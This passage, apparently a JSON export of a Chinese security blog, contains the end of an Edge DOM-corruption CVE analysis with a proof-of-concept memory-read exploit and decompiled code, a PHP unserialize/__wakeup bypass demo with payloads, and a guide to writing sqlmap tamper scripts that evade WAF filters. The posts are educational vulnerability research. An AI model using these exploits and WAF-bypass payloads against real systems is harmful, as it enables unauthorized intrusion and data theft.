oTextNode的nextSibling指向了自己 // 在这里，DOM树出现了一种类似循环的结构 for (var oNode = document.body.firstChild; oNode &amp;&amp; oNode != oNode.nextSibling; oNode = oNode.nextSibling) &#123; // 加上这段代码是为了防止被Edge检测到树的结构出现了问题 // 如果没有这段代码Js执行到这里的时候就会崩溃 &#125; if (oTextNode.nextSibling !== oTextNode) &#123; // 未触发漏洞时报错 throw new Error(\"Tree is not corrupt\"); &#125; alert(\"Set breakpoints if needed\"); // 这里是为了生成一个copy var sData = (\"A\" + oTextNode.nodeValue).substr(1); // 下面的逻辑是读取oTextNode.nodeValue的值 // 但实际上是内存中某块的位置 // 在读取之后按规则格式化输出 var sHexData = \"Read 0x\" + sData.length.toString(16); sHexData += \" bytes: ????????`????????\"; sHexQWord = \"`????????\"; for (var uBytes = 4, uOffset = 4, uIndex = 0; uIndex &lt; sData.length; uIndex++) &#123; var sHexWord = sData.charCodeAt(uIndex).toString(16); while (sHexWord.length &lt; 4) sHexWord = \"0\" + sHexWord; sHexQWord = sHexWord + sHexQWord; uBytes += 2; if (uBytes == 4) sHexQWord = \"`\" + sHexQWord; if (uBytes == 8) &#123; sHexData += \" \" + sHexQWord; sHexQWord = \"\"; uBytes = 0; &#125;; &#125;; if (sHexQWord) &#123; while (sHexQWord.length &lt; 17) &#123; if (sHexQWord.length == 8) sHexQWord += \"`\"; sHexQWord = \"????\" + sHexQWord; &#125; sHexData += \" \" + sHexQWord; &#125; alert(sHexData); // 代码执行到这里的时候会crash // 但是这里已经可以读取栈上的数据了 oTextNode.nodeValue = \"\"; &#125;; &lt;/script&gt; &lt;/head&gt; &lt;body&gt;x&lt;x id=oExistingChild&gt;&lt;/x&gt;&lt;/body&gt;&lt;/html&gt; 2.3 Code Analyze上面这个利用流程，比较关键的几个函数是CDOMTextNode::get_data、CDOMTextNode::get_length 读取数据的函数是CDOMTextNode::get_data，代码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960__int64 __fastcall CDOMTextNode::get_data(CDOMTextNode *this, unsigned __int16 **a2)&#123; unsigned __int16 **v2; // rbx@1 CDOMTextNode *this_rdi; // rdi@1 Tree::TextData *v4; // rcx@2 __int32 v5; // eax@4 BSTR v6; // rax@4 int v7; // ebp@4 struct CTreePos *v8; // rax@4 struct CTreePos *v9; // rsi@4 Tree::TextNode *v10; // rdi@4 unsigned __int16 *v11; // rax@5 Tree::ANode *v12; // rax@5 CTreePos *v13; // rcx@6 __int64 v14; // r9@9 const OLECHAR *v15; // rax@9 UINT v16; // er9@9 BSTR v17; // rax@9 UINT ui; // [sp+48h] [bp+10h]@4 unsigned __int32 v20; // [sp+50h] [bp+18h]@5 v2 = a2; this_rdi = this; if ( a2 ) &#123; *a2 = 0i64; v4 = (Tree::TextData *)*((_QWORD *)this + 6); if ( v4 ) &#123; v14 = *(_DWORD *)v4; v15 = Tree::TextData::GetText(v4, 0, 0i64); v17 = SysAllocStringLen(v15, v16); *v2 = (unsigned __int16 *)Abandonment::CheckAllocationUntyped(v17); &#125; else if ( CDOMTextNode::IsPositioned(this_rdi) ) &#123; ui = 0; v5 = CDOMTextNode::get_length(this_rdi, (__int32 *)&amp;ui); Abandonment::CheckHRESULTStrict(v5); v6 = SysAllocStringLen(0i64, ui); *v2 = (unsigned __int16 *)Abandonment::CheckAllocationUntyped(v6); v7 = 0; LODWORD(v8) = Tree::TextNode::TextNodeFromDOMTextNode((__int64)this_rdi); v9 = v8; v10 = v8; do &#123; v11 = Tree::TextNode::Text(v10, 0, &amp;v20); memcpy_s(&amp;(*v2)[v7], 2i64 * (signed int)(ui - v7), v11, 2i64 * v20); v7 += v20; v12 = Tree::TreeReader::GetNextSiblingWithFilter( v10, (enum Tree::NodeFilterResultsEnum (__stdcall __high static *)(const struct Tree::ANode *))&amp;Dom::TreeReader::ScriptableIdentityFilter); v10 = v12; &#125; while ( v12 &amp;&amp; Tree::ANode::IsTextNode(v12) &amp;&amp; CTreePos::IsSameTextOrCDataNode(v13, v9) ); &#125; &#125; return 0i64;&#125; 在函数中有一次调用(__int32 *)&ui)```1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950代码如下，其中a2的值是ui，也就是0，而CDOMTextNode::IsPositioned(this)返回值为真，即进入了第二个逻辑，在该逻辑中进行了长度的处理获取长度后，则在get\\_data函数中，在```memcpy_s(&amp;(*v2)[v7], 2i64 * (signed int)(ui - v7), v11, 2i64 * v20)```这行代码利用memcpy_s不断读取内存中的值至长度到达之前get\\_length函数返回的值位置。这里读取的是v11指向中保存地址指向的值，那我们再上溯，```v11 = Tree::TextNode::Text(v10, 0, &amp;v20);```，其中v10的值是Tree::TextNode::TextNodeFromDOMTextNode返回的一个结构体指针，而调用该函数的参数是rcx。```cc__int64 __fastcall CDOMTextNode::get_length(CDOMTextNode *this, __int32 *a2)&#123; __int32 *v2; // rax@1 signed int v3; // ebx@1 __int32 *v4; // rsi@1 CDOMTextNode *v5; // rdi@1 struct CTreePos *v7; // rax@6 struct CTreePos *v8; // rbp@6 struct CTreePos *v9; // r11@6 __int32 v10; // edi@6 Tree::ANode *v11; // rax@7 CTreePos *v12; // rcx@8 v2 = (__int32 *)*((_QWORD *)this + 6); v3 = 0; v4 = a2; v5 = this; if ( v2 ) &#123; *a2 = *v2; &#125; else if ( CDOMTextNode::IsPositioned(this) ) &#123; LODWORD(v7) = Tree::TextNode::TextNodeFromDOMTextNode((__int64)v5); v8 = v7; v9 = v7; v10 = 0; do &#123; v10 += **((_DWORD **)v9 + 7); v11 = Tree::TreeReader::GetNextSiblingWithFilter( v9, (enum Tree::NodeFilterResultsEnum (__stdcall __high static *)(const struct Tree::ANode *))&amp;Dom::TreeReader::ScriptableIdentityFilter); &#125; while ( v11 &amp;&amp; Tree::ANode::IsTextNode(v11) &amp;&amp; CTreePos::IsSameTextOrCDataNode(v12, v8) ); *v4 = v10; &#125; else &#123; v3 = -2147024809; &#125; return (unsigned int)v3;&#125; 2.4 Dynamic Analysis对get_data下断点后开始单步跟踪，发现这里get_length函数的返回值和节点oExistingChild的长度相关，也就是说，这里出现了一个bug，在本来应该读取textnode的长度的时候，返回了一个和oExistingChild长度相关的数值，即我们可以一定程度上控制读取的数据长度，当然，这里数据如果太长，在读取的时候会触发一个访问错误，导致进程崩溃无法继续读取。 最后结合动态调试和代码分析发现length是从结构体指针处偏移0x1c的位置指向的指针指向的位置中取出来，即first_struct-&gt;other_struct-&gt;length。而读取的地址位置则是结构体指针偏移0xC的位置。 3. References1. zerodayinitiative 2. microsoft 3. securitytracker 4. cve.mitre.org 5. vuldb 6. skylined blog","categories":[{"name":"cve","slug":"cve","permalink":"https://LyleMi.github.io/categories/cve/"}],"tags":[]},{"title":"php unserialize()/wakeup()漏洞","slug":"2016-10-29-php-unserialize","date":"2016-10-29T01:31:40.000Z","updated":"2018-11-27T01:55:45.290Z","comments":true,"path":"2016/10/29/2016-10-29-php-unserialize/","link":"","permalink":"https://LyleMi.github.io/2016/10/29/2016-10-29-php-unserialize/","excerpt":"unserialize和serialize这里不做赘述。 unserialize的漏洞在magic function上，如果一个类定义了__wakup()和__destruct()，则该类的实例被反序列化时，会自动调用__wakeup(), 生命周期结束时，则调用__desturct()。","text":"unserialize和serialize这里不做赘述。 unserialize的漏洞在magic function上，如果一个类定义了__wakup()和__destruct()，则该类的实例被反序列化时，会自动调用__wakeup(), 生命周期结束时，则调用__desturct()。 下面提供一个简单的demo. 123456789101112131415161718192021222324class Demo&#123; public $data; public function __construct($data) &#123; $this-&gt;data = $data; echo \"construct&lt;br /&gt;\"; &#125; public function __wakeup() &#123; echo \"wake up&lt;br /&gt;\"; &#125; public function __destruct() &#123; echo \"Data's value is $this-&gt;data. &lt;br /&gt;\"; echo \"destruct&lt;br /&gt;\"; &#125;&#125;var_dump(serialize(new Demo(\"raw value\"))); 输出 1234constructData&apos;s value is raw value.destructstring(44) &quot;O:4:&quot;Demo&quot;:1:&#123;s:4:&quot;data&quot;;s:9:&quot;raw value&quot;;&#125;&quot; 把序列化的字符串修改一下后，执行 1unserialize('O:4:\"Demo\":1:&#123;s:4:\"data\";s:15:\"malicious value\";&#125;'); 输出 123wake upData&apos;s value is malicious value.destruct 这里看到，值被修改了. 上面是一个unserialize()的简单应用，不难看出，如果__wakeup()或者 __desturct()有敏感操作，比如读写文件、操作数据库，就可以通过函数实现文件读写或者数据读取的行为。 那么，在__wakeup()中加入判断是否可以阻止这个漏洞呢？在__wakeup()中我们加入一行代码 12345public function __wakeup()&#123; if($this-&gt;data != 'raw value') $this-&gt;data = 'raw value'; echo \"wake up&lt;br /&gt;\";&#125; 但其实还是可以绕过的，在 PHP5 &lt; 5.6.25， PHP7 &lt; 7.0.10 的版本都存在wakeup的漏洞。当反序列化中object的个数和之前的个数不等时，wakeup就会被绕过，于是使用下面的payload 1unserialize('O:7:\"HITCON\":1:&#123;s:4:\"data\";s:15:\"malicious value\";&#125;'); 输出 12Data&apos;s value is malicious value.destruct 这里wakeup被绕过，值依旧被修改了。","categories":[{"name":"web","slug":"web","permalink":"https://LyleMi.github.io/categories/web/"}],"tags":[]},{"title":"sqlmap-tamper编写指南","slug":"2016-6-6-sqlmap-tamper","date":"2016-06-06T01:31:40.000Z","updated":"2018-11-27T01:55:52.104Z","comments":true,"path":"2016/06/06/2016-6-6-sqlmap-tamper/","link":"","permalink":"https://LyleMi.github.io/2016/06/06/2016-6-6-sqlmap-tamper/","excerpt":"注：最近遇到了一些奇奇怪怪的waf，想自己写一些tamper但是发现没有参考材料可以使用，因此写了这篇文章，以方便进行自定义的tamper编写。笔者笔力有限，如有错误，敬请读者们指正。 0x00 sqlmap tamper简介sqlmap是一个自动化的SQL注入工具，而tamper则是对其进行扩展的一系列脚本，主要功能是对本来的payload进行特定的更改以绕过waf。","text":"注：最近遇到了一些奇奇怪怪的waf，想自己写一些tamper但是发现没有参考材料可以使用，因此写了这篇文章，以方便进行自定义的tamper编写。笔者笔力有限，如有错误，敬请读者们指正。 0x00 sqlmap tamper简介sqlmap是一个自动化的SQL注入工具，而tamper则是对其进行扩展的一系列脚本，主要功能是对本来的payload进行特定的更改以绕过waf。 0x01 一个最小的例子为了说明tamper的结构，让我们从一个最简单的例子开始 1234567891011# sqlmap/tamper/escapequotes.pyfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWESTdef dependencies(): passdef tamper(payload, **kwargs): return payload.replace(\"'\", \"\\\\'\").replace('\"', '\\\\\"') 不难看出，一个最小的tamper脚本结构为priority变量定义和dependencies、tamper函数定义。 priority定义脚本的优先级，用于有多个tamper脚本的情况。 dependencies函数声明该脚本适用/不适用的范围，可以为空。 tamper是主要的函数，接受的参数为payload和**kwargs返回值为替换后的payload。比如这个例子中就把引号替换为了\\\\\\\\&#39;。 0x02 详细介绍第一部分完成了一个最简单的tamper架构，下面我们进行更详细的介绍 tamper函数tamper是整个脚本的主体。主要用于修改原本的payload。举例来说，如果服务器上有这么几行代码 12$id = trim($POST($id),'union');$sql=\"SELECT * FROM users WHERE id='$id'\"; 而我们的payload为1-8363&apos; union select null -- - 这里因为union被过滤掉了，将导致payload不能正常执行，那么就可以编写这样的tamper 12def tamper(payload, **kwargs): return payload.replace('union','uniounionn') 保存为replaceunion.py，存到sqlmap/tamper/下，执行的时候带上–tamper=replaceunion的参数，就可以绕过该过滤规则 dependencies函数dependencies函数，就tamper脚本支持/不支持使用的环境进行声明，一个简单的例子如下： 12345678# sqlmap/tamper/echarunicodeencode.pyfrom lib.core.common import singleTimeWarnMessagedef dependencies(): singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against ASP or ASP.NET web applications\" % os.path.basename(__file__).split(\".\")[0])# singleTimeWarnMessage() 用于在控制台中打印出警告信息 kwargs在官方提供的47个tamper脚本中，kwargs参数只被使用了两次，两次都只是更改了http-header，这里以其中一个为例进行简单说明 123456# sqlmap/tamper/vanrish.pydef tamper(payload, **kwargs): headers = kwargs.get(\"headers\", &#123;&#125;) headers[\"X-originating-IP\"] = \"127.0.0.1\" return payload 这个脚本是为了更改X-originating-IP，以绕过WAF，另一个kwargs的使用出现于xforwardedfor.py，也是为了改header以绕过waf 0x3 结语tamper的编写远不止这些，本文只就其最基本的结构进行探讨。作为sqlmap的扩展，在编写tamper时几乎所有的sqlmap内置的函数、变量都可以使用，本文不一一列出。 0x04 附录：部分常数值123456789101112131415161718192021222324# sqlmap/lib/enums.pyclass PRIORITY: LOWEST = -100 LOWER = -50 LOW = -10 NORMAL = 0 HIGH = 10 HIGHER = 50 HIGHEST = 100class DBMS: ACCESS = \"Microsoft Access\" DB2 = \"IBM DB2\" FIREBIRD = \"Firebird\" MAXDB = \"SAP MaxDB\" MSSQL = \"Microsoft SQL Server\" MYSQL = \"MySQL\" ORACLE = \"Oracle\" PGSQL = \"PostgreSQL\" SQLITE = \"SQLite\" SYBASE = \"Sybase\" HSQLDB = \"HSQLDB\"","categories":[{"name":"web","slug":"web","permalink":"https://LyleMi.github.io/categories/web/"}],"tags":[]}]}